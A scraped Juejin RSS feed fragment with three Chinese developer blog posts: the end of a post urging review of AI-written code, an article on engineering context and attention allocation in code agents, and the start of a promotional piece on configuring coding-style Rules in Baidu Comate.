<p>“如果一个函数你写了 90%，剩下 10% 让 AI 去生成，它能给你把前面 90% 的代码全部改错。”</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63387e05e38e4868833017fb3f826e33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=dbY2QSbKmRsJFxRuBYobXHAKiig%3D" alt="" loading="lazy"/></p>
<p>你可以把这句话当个笑话听，只要它不发生在自己身上。</p>
<p>AI 确实能提效，但如果完全依赖 AI、不审查代码就提交，很容易出现线上事故。<strong>而对于大厂来说，即使效率低一点，也必须保证代码安全。</strong></p>
<p>关注我的朋友也应该知道，今年互联网出现了多少 P0 级重大故障？很难说背后是不是 AI 的锅。<strong>但 AI 是无法被追责的，给 AI 擦屁股的只有用 AI 的我们自己。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02a8d75b46b9475695744a150462e01d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=JmuL3ISo4MakEW7%2FwReVtAIkRPc%3D" alt="" loading="lazy"/></p>
<p>最后我想说，AI 编程已经成为大趋势。就拿《腾讯 2025 研发大数据报告》中的数据来说，腾讯 <strong>超过 90% 的程序员</strong> 正在使用 AI 编程助手辅助写代码。更夸张的是，2025 年全公司有 <strong>50% 的新增代码</strong> 由 AI 辅助生成。也就是说，每两行代码，就有一行来自 AI。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98436abe2c294575ba22894c402175dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=rJp99hJurApUbczKzlFD%2FksXxCo%3D" alt="" loading="lazy"/></p>
<p>即使你所在的公司禁用了 Cursor 等 AI 工具和某些大模型，你自己也应该积极学习 AI 编程工具，<strong>而且要用最新的</strong>，这直接关乎你未来的竞争力。就跟打游戏一样，你拿历史版本的 T0 去打这个版本的 T0，不就会被吊着打么？</p>
<p>AI 发展非常迅速，每天都有新东西，可能 1 个月不关注，你用的工具和大模型就落后几个版本了。所以我也做了个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fai.codefather.cn%2F" target="_blank" title="https://ai.codefather.cn/" ref="nofollow noopener noreferrer">AI 导航网站</a>，帮大家更快获取到最新的 AI 学习资源、工具大全、资讯等等。感兴趣的同学可以免费使用~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9b33f089401454992169d27d302d5de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=iOplnnGImosAVh0k74MVkWrDM%2FQ%3D" alt="鱼皮AI导航网 ai.codefather.cn" loading="lazy"/></p>
<h2 data-id="heading-0">更多</h2>
<p>💻 编程学习交流：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">编程导航</a> 📃 简历快速制作：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">老鱼简历</a> ✏️ 面试刷题神器：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">面试鸭</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[注意力机制在Code Agent的应用]]></title>    <link>https://juejin.cn/post/7584061465398509609</link>    <guid>https://juejin.cn/post/7584061465398509609</guid>    <pubDate>2025-12-16T07:35:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584061465398509609" data-draft-id="7584110439933001774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="注意力机制在Code Agent的应用"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-16T07:35:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="twl"/> <meta itemprop="url" content="https://juejin.cn/user/3016715635534029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            注意力机制在Code Agent的应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3016715635534029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    twl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:35:02.000Z" title="Tue Dec 16 2025 07:35:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 <strong>Code Agent（代码智能体）</strong> 的实际落地中，<strong>注意力机制（Attention）并不只是“Transformer 内部原理”</strong> ，而是被<strong>显式或隐式地工程化使用</strong>，直接影响效果、成本和可控性。下面从「能落地的实践视角」系统讲一下。</p>
<hr/>
<h2 data-id="heading-0">一句话总览</h2>
<blockquote>
<p>在 Code Agent 中，注意力机制的核心作用是：<br/>
<strong>把有限的上下文、算力和推理步骤，集中用在“当前最有价值的代码与信息”上。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">一、上下文注意力：解决「代码太多，窗口不够」</h2>
<h3 data-id="heading-2">1️⃣ 文件级 / 代码块级注意力（Context Routing）</h3>
<p><strong>问题</strong></p>
<ul>
<li>一个仓库几万行代码，LLM 上下文放不下</li>
<li>但 agent 只需要 <em>和当前任务最相关的部分</em></li>
</ul>
<p><strong>实践做法</strong></p>
<ul>
<li>
<p>先做一层「注意力筛选」：</p>
<ul>
<li>文件级：哪些文件最相关</li>
<li>代码块级：哪些函数 / class 最重要</li>
</ul>
</li>
<li>
<p>再把筛选结果送进 LLM</p>
</li>
</ul>
<p><strong>常见实现</strong></p>
<pre><code class="hljs language-css" lang="css">用户问题
  ↓
Embedding / 关键词 / 调用图
  ↓
<span class="hljs-attribute">Top</span>-K 文件
  ↓
<span class="hljs-attribute">Top</span>-K 函数
  ↓
LLM
</code></pre>
<p>📌 <strong>本质</strong>：<br/>
这是 <strong>“显式注意力”</strong> ，不是模型自己算的，而是工程层帮它“代劳”。</p>
<hr/>
<h3 data-id="heading-3">2️⃣ Diff / Patch 注意力（编辑型 Agent 必备）</h3>
<p>在 Cursor、Claude Code、Aider 这类工具中非常关键。</p>
<p><strong>做法</strong></p>
<ul>
<li>
<p>高度关注：</p>
<ul>
<li>最近修改的 diff</li>
<li>当前光标附近代码</li>
<li>报错栈涉及的函数</li>
</ul>
</li>
</ul>
<p><strong>效果</strong></p>
<ul>
<li>避免模型“通读整个文件”</li>
<li>提升修改精准度，减少误伤</li>
</ul>
<p>📌 Cursor 的「只改相关代码」能力，本质就是 <strong>diff-aware attention</strong></p>
<hr/>
<h2 data-id="heading-4">二、任务级注意力：让 Agent 不“跑偏”</h2>
<h3 data-id="heading-5">3️⃣ Planning Attention（计划阶段聚焦）</h3>
<p>在 <strong>多步 Code Agent（ReAct / Plan-Execute）</strong> 中：</p>
<pre><code class="hljs language-markdown" lang="markdown">Plan:
<span class="hljs-bullet">1.</span> 找到 Bug 位置
<span class="hljs-bullet">2.</span> 分析原因
<span class="hljs-bullet">3.</span> 修改代码
<span class="hljs-bullet">4.</span> 补测试
</code></pre>
<p><strong>注意力点</strong></p>
<ul>
<li>
<p>每一步只关注：</p>
<ul>
<li>当前目标</li>
<li>当前输入（代码 / 日志 / 结果）</li>
</ul>
</li>
</ul>
<p><strong>工程技巧</strong></p>
<ul>
<li>
<p>每步调用 LLM 时：</p>
<ul>
<li>丢弃无关历史</li>
<li>只保留「计划 + 当前上下文」</li>
</ul>
</li>
</ul>
<p>📌 这是 <strong>“时间维度的注意力裁剪”</strong></p>
<hr/>
<h3 data-id="heading-6">4️⃣ Error-driven Attention（错误驱动）</h3>
<p><strong>非常实用</strong></p>
<p>当 agent 运行代码失败：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-built_in">TypeError</span>: xxx is not <span class="hljs-keyword">callable</span>
  at foo.py:<span class="hljs-number">123</span>
</code></pre>
<p><strong>注意力自动转移到</strong></p>
<ul>
<li>报错文件</li>
<li>报错行</li>
<li>调用链</li>
</ul>
<p><strong>实现方式</strong></p>
<ul>
<li>解析 traceback</li>
<li>构建「错误相关上下文」</li>
<li>强制覆盖原上下文</li>
</ul>
<p>📌 这一步对 Code Agent 成功率提升非常大</p>
<hr/>
<h2 data-id="heading-7">三、工具 &amp; 记忆注意力：选“该用的工具 / 记忆”</h2>
<h3 data-id="heading-8">5️⃣ Tool Attention（工具选择）</h3>
<p>Code Agent 往往有多个工具：</p>
<ul>
<li>read_file</li>
<li>search</li>
<li>run_tests</li>
<li>run_code</li>
<li>git_diff</li>
</ul>
<p><strong>注意力机制体现为</strong></p>
<ul>
<li>
<p>根据当前任务状态</p>
</li>
<li>
<p>决定：</p>
<ul>
<li>用哪个工具</li>
<li>传哪些参数</li>
</ul>
</li>
</ul>
<p>📌 LLM 的 cross-attention：</p>
<blockquote>
<p>prompt（任务） ←→ tool schema（能力）</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">6️⃣ Memory Attention（长期记忆不是全都重要）</h3>
<p>在带 <strong>Memory 的 Code Agent</strong> 中：</p>
<ul>
<li>历史修改习惯</li>
<li>项目约定</li>
<li>技术选型</li>
</ul>
<p><strong>做法</strong></p>
<ul>
<li>给记忆打标签 / embedding</li>
<li>每次只取与当前任务最相关的记忆</li>
</ul>
<p>📌 否则 memory 会变成「噪音仓库」</p>
<hr/>
<h2 data-id="heading-10">四、模型层注意力：代码特有优化</h2>
<h3 data-id="heading-11">7️⃣ 结构感知注意力（Code-aware Attention）</h3>
<p>代码不同于自然语言：</p>
<ul>
<li>强结构（AST）</li>
<li>强引用关系（调用 / import）</li>
<li>强局部性</li>
</ul>
<p><strong>实践方向</strong></p>
<ul>
<li>AST-aware chunking</li>
<li>函数 / class 作为 attention 单位</li>
<li>调用图增强检索</li>
</ul>
<p>📌 比“按 token 截断”好太多</p>
<hr/>
<h3 data-id="heading-12">8️⃣ 多模态注意力（代码 + 文档 + 测试）</h3>
<p>成熟的 Code Agent 会同时关注：</p>
<ul>
<li>代码</li>
<li>README / 设计文档</li>
<li>单测</li>
<li>日志</li>
</ul>
<p><strong>Attention 分配示例</strong></p>
<pre><code class="hljs language-shell" lang="shell">当前是修 Bug：
<span class="hljs-meta prompt_">  60% </span><span class="bash">错误日志</span>
<span class="hljs-meta prompt_">  30% </span><span class="bash">相关代码</span>
<span class="hljs-meta prompt_">  10% </span><span class="bash">文档</span>
</code></pre>
<p>这通常通过 <strong>prompt 结构 + 上下文配额控制</strong> 实现。</p>
<hr/>
<h2 data-id="heading-13">五、总结成一张表</h2>








































<table><thead><tr><th>层级</th><th>注意力作用</th><th>实际收益</th></tr></thead><tbody><tr><td>上下文层</td><td>选对代码</td><td>不爆上下文</td></tr><tr><td>任务层</td><td>聚焦当前步骤</td><td>不跑偏</td></tr><tr><td>错误层</td><td>围绕报错</td><td>修复成功率↑</td></tr><tr><td>工具层</td><td>用对工具</td><td>推理效率↑</td></tr><tr><td>记忆层</td><td>取对记忆</td><td>个性化</td></tr><tr><td>结构层</td><td>理解代码结构</td><td>修改更准</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-14">关键结论（很重要）</h2>
<blockquote>
<p><strong>Code Agent 的效果 ≠ 更大的模型</strong><br/>
<strong>而是 = 更聪明的注意力分配</strong></p>
</blockquote>
<p>很多“看起来很智能”的代码 agent：</p>
<ul>
<li>70% 是工程化 attention</li>
<li>30% 才是模型能力</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？]]></title>    <link>https://juejin.cn/post/7584243498527358976</link>    <guid>https://juejin.cn/post/7584243498527358976</guid>    <pubDate>2025-12-16T07:53:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527358976" data-draft-id="7584071941024251919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？"/> <meta itemprop="keywords" content="前端,程序员,前端框架"/> <meta itemprop="datePublished" content="2025-12-16T07:53:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="文心快码BaiduComate"/> <meta itemprop="url" content="https://juejin.cn/user/992209294070809"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/992209294070809/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    文心快码BaiduComate
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:53:45.000Z" title="Tue Dec 16 2025 07:53:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>百度文心快码（Comate）的 <strong>Rules</strong> 功能通过注入企业级“员工手册”，让 AI 精准掌握业务规范与逻辑，将复杂开发周期缩短 <strong>40%</strong> ，真正实现工程效能的质变。</p>
</blockquote>
<p>为什么同样的AI编程助手，有人用来当“百度百科”，有人却能用它替代50%的重复劳动？百度文心快码（Comate） 的 Rules（自定义规则） 功能是分水岭。它就像给AI装上了“企业级员工手册”，能让AI精准读懂业务逻辑、强制统一代码风格、自动规避架构风险。实测数据显示，熟练配置Rules后，复杂业务模块开发周期可缩短40%，Bug排查效率提升百倍，真正实现从“通用大模型”到“懂业务的专属资深架构师”的进化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0513e68bac84433a966e086e0bc14282~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476425&amp;x-signature=aAyEkML3PKKbU6ooDXPjsse5yv0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f08715fdf2b4dfea4a836a6b29b4f10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476425&amp;x-signature=TBgB3dns9MakzcJrq79oybDlsOk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-0">01/ Comate + Rules，提效成果如何？</h2>
<ul>
<li><strong>效率质变数据</strong>：百度核心业务场景中，配置Rules后，标准化页面生成的开发周期从 <strong>5天压缩至3天</strong>；针对特定逻辑Bug的排查修复时间，从人工排查的 <strong>1天骤降至10分钟</strong>。</li>
<li><strong>代码规范“紧箍咒”</strong> ：Rules 能够对AI生成代码进行工程级约束。例如：强制CSS类名使用Kebab-case（短横线命名）；强制组件必须引入项目通用的 .less 变量库；禁止生成深层嵌套的“回调地狱”结构。</li>
<li><strong>团队协作零磨损</strong>：Rules 支持 <strong>Team-Level（团队级）</strong> 配置共享。架构师制定一套规则（如“所有金额字段必须经过 formatCurrency 处理”），全团队成员的 Comate 自动生效。这直接消灭了 Code Review 中 80% 关于代码风格的争论。</li>
<li><strong>全栈场景覆盖</strong>：不仅限于前端组件，Rules 同样适用于后端（Restful 接口规范、日志脱敏格式）、测试脚本（自动生成覆盖率要求）及文档撰写。它是将 AI 算力转化为工程生产力的核心中间件。</li>
</ul>
<h2 data-id="heading-1">02/ Rules能在哪些维度上约束Comate？</h2>
<p>很多开发者在使用 AI Coding 工具时都有过这样的挫败感：</p>
<blockquote>
<p>“每次都要告诉它：别用 var 用 const，别用原生 CSS 给我用 Less，别自己造轮子去调公共组件…… 只要新开一个对话窗口，它就全忘了，像个永远教不会的实习生。”</p>
</blockquote>
<p>这就是“通用大模型”的通病——它懂海量的代码知识，但不懂你团队的“潜规则”。</p>
<p><strong>Rules 的本质，就是 AI 的“持久化记忆”与“行为准则”。</strong></p>
<p>它不是简单的 Prompt 拼接，而是深植于 IDE 上下文的<strong>系统级逻辑</strong>。通过 Rules，我们将“个人偏好”和“团队规范”固化下来，让 Comate 在生成代码之前，先“查阅手册”，再“执行任务”。</p>
<h3 data-id="heading-2">1. 命名约定：代码界的“起名大会”终结者</h3>
<p>没有 Rules 时，AI 可能会生成 temp1、data_final、flag 这种毫无语义的变量名。</p>
<p>配置 Rules 后，你可以明确要求：</p>
<ul>
<li>所有布尔值变量必须以 is、has、can 开头。</li>
<li>私有方法必须以下划线 _ 开头。</li>
